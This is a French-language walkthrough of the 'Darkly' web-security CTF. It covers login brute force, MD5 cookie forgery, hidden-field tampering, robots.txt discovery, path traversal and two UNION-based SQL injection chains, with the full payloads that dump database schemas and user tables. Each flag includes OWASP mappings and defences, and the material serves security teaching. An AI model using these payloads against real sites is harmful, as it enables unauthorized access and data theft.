# Darkly 42
## 1) Flag "brut_force_signin"
### Etapes pour trouver le flag
1. accès à la page "?page=signin" et essais de connexion avec identifiants aléatoires : affichage de WrongAnswer.gif
2. récupérations d'identifiants de login sur d'autres pages comme la page 'survey' : wil, ol, ... et ajout 'admin' qui reste un classique.
3. attaque par force brute au moyen d'une liste de mots de passe et d'un script qui va envoyer des requetes et classer trouver les succès ou échecs selon l'apparition de WrongAnswer.gif ou non.

### Description
Méthode utilisée par les attaquants pour obtenir un accès non autorisé à un système ou à des données en essayant systématiquement toutes les combinaisons possibles de mots de passe ou de clés de cryptage jusqu'à trouver la bonne.

### OWASP associés
1. OWASP A07:2021 - Identification and Authentication Failures

### Comment s'en protéger
1. Limiter les tentatives de connexion
2. Utiliser une authentification multi-facteurs
3. Renforcer les politiques de mots de passe
4. Ajouter des mesures anti-bots
5. Journaliser et surveiller
6. Chiffrement des mots de passe

## 2) Flag "cookie_md5"
### Etapes pour trouver le flag
1. en ouvrant la console du browser web, visualisation d'un cookie d'identifiant "I_am_admin" dans les cookies de requete
2. decryptage de la chaine associée via ressource externe (cf. Ressources)
3. décryptage montre qu'il s'agit d'une chaine MD5 signifiant false
4. modification du cookie pour une chaine MD5 signifiant true : b326b5062b2f0e69046810717534cb09

### Description 
Utilisation d'une méthode de hashage pour transformer des données en une empreinte numérique fixe. Le MD5 est une fonction de hachage cryptographique qui produit une valeur de 128 bits (16 octets). Bien que largement utilisé, le MD5 est considéré comme obsolète et vulnérable aux attaques de collision, où deux entrées différentes produisent la même empreinte numérique. Il est recommandé d'utiliser des algorithmes de hachage plus sécurisés comme SHA-256.

### OWASP associés
1. OWASP A01:2021 - Broken Access Control
2. OWASP A03:2021 - Injection
3. OWASP A07:2021 - Identification and Authentication Failures
4. OWASP A08:2021 - Software and Data Integrity Failures

### Comment s'en protéger
1. Utilisation de tokens de session aléatoires
2. Validation coté serveur
3. Chiffrement plus complexe utilisant par exemple sha256 et non basé sur mots de passes simples

## 3) Flag "edit_request_recover"
### Etapes pour trouver le flag
1. en ouvrant la page ?=recover en allant sur " I forgot my password ", visualisation d'une adresse mail inscrite dans un champ html caché: webmaster@borntosec.com
2. modification de cette adresse mail 

### Description
Balise html cachée visible dans la console et qui dévoile une donnée sensible. De plus elle intervient dans une fonction importante qui peut donc etre detournee.

### OWASP associés
1. OWASP A04:2021 - Insecure Design
2. OWASP A05:2021 - Security Misconfiguration

### Comment s'en protéger
1. Ne pas inclure d'informations sensibles dans des champs HTML cachés
2. Utiliser des mécanismes de récupération de mot de passe sécurisés
3. Valider et filtrer les entrées utilisateur côté serveur
4. Mettre en place des contrôles d'accès appropriés pour les informations sensibles

## 4) Flag ".hidden"
### Etapes pour trouver le flag
1. visiter robot.txt
2. ce dernier dévoile 2 dossiers : /whatever et /.hidden. Pour cette faille-ci, nous allons nous focaliser sur le dossier /.hidden
3. ce dossier contient d'autres dossiers contenant eux-memes d'autres dossiers ainsi qu'un fichier readme ne contenant pas de flag pour la plupart.
4. utilisation d'un script python pour télécharger tous les contenus des readme -> apparition du flag.

### Description
Selon [robots-txt.com](https://robots-txt.com/) : "Le protocole d'exclusion des robots, plus connu sous le nom de robots.txt, est une convention visant à empêcher les robots d'exploration (web crawlers) d'accéder à tout ou une partie d'un site web. Le fichier robots.txt, à placer la racine d'un site web, contient une liste de ressources du site qui ne sont pas censées être explorées par les moteurs de recherches. Ce fichier permet également d'indiquer aux moteurs l'adresse du fichier sitemap.xml du site."
En revanche, cela ne rend pas les fichiers inaccessibles ni invisibles lors d'une recherche par une personne malveillante. 

### OWASP associés
1. OWASP A01:2021 - Broken Access Control
2. OWASP A06:2021 - Vulnerable and Outdated Components
3. OWASP A09:2021 - Security Logging and Monitoring Failures

### Comment s'en protéger
Il est important de ne pas stocker d'informations sensibles dans des fichiers accessibles via robots.txt et de sécuriser l'accès à ces fichiers par d'autres moyens, comme l'authentification ou le chiffrement.


## 5) Flag "injection_sql_member"
### Etapes pour trouver le flag
1. La page member semble permettre de faire des requetes sql
2. Injection : 
```sql 
5 UNION SELECT null, database() -- Identifier le nom de la base de données en cours.
```
3. Injection : 
```sql 
5 UNION SELECT null, table_name FROM information_schema.tables WHERE table_schema=database() -> users -- Lister les tables disponibles dans la base de données active.
```
4. Injection : 
```sql 
5 UNION SELECT null, column_name FROM information_schema.columns WHERE table_schema=database() -- Identifier les colonnes disponibles dans la base de données active
```
5. Injection : 
```sql 
5 UNION SELECT null, concat(user_id, CHAR(10), first_name, CHAR(10), last_name, CHAR(10), town, CHAR(10), country, CHAR(10), planet, CHAR(10), Commentaire, CHAR(10), countersign) FROM users -- Extraire les données de la table users et les afficher.
```
6. Affichage de : 
5ff9d0165b4f92b14994e5c685cdce28 et Decrypt this password -> then lower the char. Sh256 on it and it's good !

### Description
Une faille de type SQL se produit lorsqu'une application ne valide pas correctement les entrées utilisateur, permettant ainsi à des données non fiables d'être exécutées comme des commandes SQL. Cela peut permettre à un attaquant de contourner l'authentification, d'extraire des données sensibles, de modifier ou de supprimer des données, voire de compromettre entièrement le serveur de base de données.

### OWASP associés
1. OWASP A03:2021 - Injection

### Comment s'en protéger
1. Utiliser des requêtes préparées avec des paramètres liés 
2. Valider et assainir les entrées utilisateur
3. Limiter les permissions des comptes de base de données
4. Utiliser des ORM (Object-Relational Mapping)
5. Masquer les messages d'erreur SQL
6. Surveiller et détecter les injections SQL 

## 6) Flag "injection_sql_search_image"
### Etapes pour trouver le flag
1. Meme principe que ci-dessus, dans le champ de la page searching. Injection : 
```sql
5 UNION SELECT null, database()
```
2. Injection : 
```sql 
5 UNION SELECT null, table_name FROM information_schema.tables WHERE table_schema=database() -> list_images
```
3. Injection : 
```sql 
5 UNION SELECT null, column_name FROM information_schema.columns WHERE table_schema=database()
```
4. Injection : 
```sql 
5 UNION SELECT null, concat(id, CHAR(10), url, CHAR(10), title, CHAR(10), comment) FROM list_images
```
5. Affichage de : 
1928e8083cf461a51303633093573c46 et Decrypt this password -> then lower the char. Sh256 on it and it's good !

### Description
idem que ci-dessus

### OWASP associés
idem que ci-dessus

### Comment s'en protéger
idem que ci-dessus

## 7) Flag "path_traversal"
### Etapes pour trouver le flag
1. Tenter de remonter dans l'arborescence du site en ajoutant des ../../
2. Entrer le chemin d'acces cf. Ressouces/path_traversal

### Description
Cette technique consiste à accéder à des répertoires ou fichiers non autorisés en manipulant les chemins d'accès, souvent en utilisant des chemins relatifs pour contourner les restrictions de sécurité du site.

### OWASP associés
1. OWASP A01:2021 - Broken Access Control

### Comment s'en protéger
1. Valider les entrées utilisateur
2. Restreindre les fichiers accessibles 
3. Contrôler les permissions d'accès aux fichiers et répertoires 
4. Utiliser un pare-feu d'application web (WAF) 
5. Ne pas exposer de messages d'erreur détaillé